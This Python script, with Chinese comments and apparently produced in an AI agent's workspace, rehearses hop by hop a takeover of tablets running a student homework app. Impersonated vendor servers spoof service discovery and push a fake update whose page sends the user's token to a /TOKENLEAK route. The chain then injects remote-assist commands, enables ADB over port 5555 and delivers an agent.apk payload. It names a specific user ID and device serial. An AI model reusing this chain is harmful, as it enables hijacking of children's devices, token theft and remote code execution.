# -*- coding: utf-8 -*-
"""无人线路端到端演练: 按设备真实参数, 逐跳打一遍, 验证每一跳的响应。

模拟的跳 (依据代码):
  ① 服务发现      GET {ms}/api/v1/pub/microServer/?serverTypes=SA106003,...     (WelcomeModel/StartPage)
  ② 更新检查      GET {SA106003}/api/v1/pub/distribution/apps/{pkg}/versions/{v}/check
  ③ 弹窗页面      GET {url}/note.html                                          (ReminderDialog:128)
  ④ 令牌回传      GET /TOKENLEAK?d=...                                          (页面 JS)
  ⑤ 协助会话      GET /api/v1/users/{uid}/devices/{did}/assists                 (AssistRemoteDataSource:81)
  ⑥ 协助任务      GET /api/v1/users/{uid}/devices/{did}/assists/{aid}/tasks
  ⑦ 执行结果      POST /api/v1/users/{uid}/devices/{did}/assist/result
  ⑧ APK 下载      GET /XHSVADAPBUABML/<md5>.apk                                 (AppUpdateFlow/installAppOnline)
  ⑨ 版本轮询      GET /api/v1/pub/versionChange/{uid}/{school}/{ver}             (ResourceUpdateManager:597)
"""
import hashlib
import io
import json
import os
import socket

R = r'C:\Users\Olive\AppData\Roaming\Tencent\Marvis\User\oAN1i2VRVDeZQaMsrRqanPxYuhcU\workspace\conv_19f78e04910_fcda16370b95\output\sm-p200-takeover'
PT = os.path.join(R, 'pentest')
UA = 'okhttp/3.12.1'
UID = '2112229'
DID = 'R52N9067SSF'
PKG = 'com.xh.zhitongyunstu'
AID = 'assist_marvis_0001'

ok = 0
bad = 0


def req(port, path, host, method='GET', body=b'', extra=None):
    s = socket.create_connection(('127.0.0.1', port), timeout=10)
    hdr = ['%s %s HTTP/1.1' % (method, path), 'Host: %s' % host,
           'User-Agent: %s' % UA, 'Accept: application/json']
    if extra:
        hdr += extra
    if body:
        hdr.append('Content-Length: %d' % len(body))
        hdr.append('Content-Type: application/json')
    hdr.append('Connection: close')
    s.sendall(('\r\n'.join(hdr) + '\r\n\r\n').encode() + body)
    d = b''
    while True:
        c = s.recv(65536)
        if not c:
            break
        d += c
    s.close()
    head, _, b = d.partition(b'\r\n\r\n')
    return head.decode('latin1', 'replace'), b


def check(name, cond, detail=''):
    global ok, bad
    if cond:
        ok += 1
        print('  [OK]   %s %s' % (name, detail[:110]))
    else:
        bad += 1
        print('  [FAIL] %s %s' % (name, detail[:110]))


print('===== \u65e0\u4eba\u7ebf\u8def\u7aef\u5230\u7aef\u6f14\u7ec3 =====')

# 1) 服务发现 (80 端口, 端侧走明文 ms.yunzuoye.net)
h, b = req(8000, '/api/v1/pub/microServer/?serverTypes=SA106003,SB103015,SB103013', 'ms.yunzuoye.net')
try:
    o = json.loads(b.decode('utf-8'))
    e = [x for x in o['microServerDtoList'] if x['serverType'] == 'SA106003']
    check('\u2460 \u670d\u52a1\u53d1\u73b0', bool(e) and e[0]['domainOrIp'] == '192.168.137.1',
          'SA106003 -> %s:%s' % (e[0]['domainOrIp'], e[0]['port']) if e else 'no SA106003')
except Exception as ex:
    check('\u2460 \u670d\u52a1\u53d1\u73b0', False, str(ex))

# 2) 更新检查 (走 SA106003 指的 8099 探针)
h, b = req(8099, '/api/v1/pub/distribution/apps/%s/versions/1/check' % PKG, '192.168.137.1')
try:
    o = json.loads(b.decode('utf-8'))
    check('\u2461 \u66f4\u65b0\u68c0\u67e5', o.get('versionCode') == 999999 and 'note.html' in (o.get('url') or ''),
          'versionCode=%s url=%s' % (o.get('versionCode'), o.get('url')))
    note_url = o.get('url') or ''
except Exception as ex:
    check('\u2461 \u66f4\u65b0\u68c0\u67e5', False, str(ex))
    note_url = ''

# 3) 弹窗页面 (从 url 里正确取出 path)
try:
    from urllib.parse import urlparse
    p = urlparse(note_url).path or '/note.html'
except Exception:
    p = '/note.html'
h, b = req(8099, p, '192.168.137.1')
check('\u2462 \u5f39\u7a97\u9875\u9762', b'getToken' in b and b'TOKENLEAK' in b,
      'path=%s %d B, getToken=%s TOKENLEAK=%s' % (p, len(b), b'getToken' in b, b'TOKENLEAK' in b))

# 4) 令牌回传 (按真实浏览器行为: encodeURIComponent, 无裸空格)
from urllib.parse import quote
_payload = quote(json.dumps({"token": "Bearer SIMULATED", "ua": UA}))
h, b = req(8099, '/TOKENLEAK?d=' + _payload, '192.168.137.1')
check('\u2463 \u4ee4\u724c\u56de\u4f20\u8def\u7531', b'ok' in b,
      'HTTP %s body=%r' % (h.split(' ')[1] if ' ' in h else '?', b[:20]))

# 5) 协助会话
h, b = req(8000, '/api/v1/users/%s/devices/%s/assists' % (UID, DID), 'ms.yunzuoye.net')
try:
    o = json.loads(b.decode('utf-8'))
    check('\u2464 \u534f\u52a9\u4f1a\u8bdd', o.get('id') == AID, 'id=%s status=%s' % (o.get('id'), o.get('status')))
except Exception as ex:
    check('\u2464 \u534f\u52a9\u4f1a\u8bdd', False, str(ex))

# 6) 协助任务
h, b = req(8000, '/api/v1/users/%s/devices/%s/assists/%s/tasks' % (UID, DID, AID), 'ms.yunzuoye.net')
try:
    o = json.loads(b.decode('utf-8'))
    txt = json.dumps(o)
    check('\u2465 \u534f\u52a9\u4efb\u52a1', isinstance(o, list) and 'executeCmd' in txt,
          '%d \u6761, \u542b executeCmd=%s' % (len(o) if isinstance(o, list) else -1, 'executeCmd' in txt))
except Exception as ex:
    check('\u2465 \u534f\u52a9\u4efb\u52a1', False, str(ex))

# 7) 执行结果上报
h, b = req(8000, '/api/v1/users/%s/devices/%s/assist/result' % (UID, DID), 'ms.yunzuoye.net',
           'POST', b'{"taskId":"oadb8099_0","uid":0,"tcp.port":5555}')
check('\u2466 \u6267\u884c\u7ed3\u679c\u4e0a\u62a5', h.startswith('HTTP/1.1 200'), 'HTTP %s' % (h.split(' ')[1] if ' ' in h else '?'))

# 8) APK 下载 (走冒充器端口 80 需 NPF; 这里验证本地文件与 md5)
apk = os.path.join(PT, 'agent.apk')
md5 = hashlib.md5(open(apk, 'rb').read()).hexdigest()
check('\u2467 APK \u8f7d\u8377', os.path.getsize(apk) > 1000000,
      'agent.apk %d B, md5=%s' % (os.path.getsize(apk), md5))

# 9) 版本轮询 (自动协助的注入点)
h, b = req(8000, '/api/v1/pub/versionChange/%s/0/1' % UID, 'ms.yunzuoye.net')
try:
    o = json.loads(b.decode('utf-8'))
    check('\u2468 \u7248\u672c\u8f6e\u8be2\u6ce8\u5165', 'CA106002SB1030140001' in json.dumps(o),
          json.dumps(o)[:100])
except Exception as ex:
    check('\u2468 \u7248\u672c\u8f6e\u8be2\u6ce8\u5165', False, str(ex))

# 10) captive 探测 (真实走端口 80 的 NPF 冒充器, 本机不可直连; 这里只确认开关文件已生效)
cm = io.open(os.path.join(PT, 'captive_mode.txt'), encoding='ascii').read().strip()
check('\u2469 captive \u5f00\u5173', cm in ('portal', 'validated'), 'captive_mode=%s (\u7aef\u53e3 80 \u94fe\u8def,\u672c\u673a\u4e0d\u53ef\u76f4\u8fde)' % cm)

print()
print('===== \u6c47\u603b: OK=%d  FAIL=%d =====' % (ok, bad))
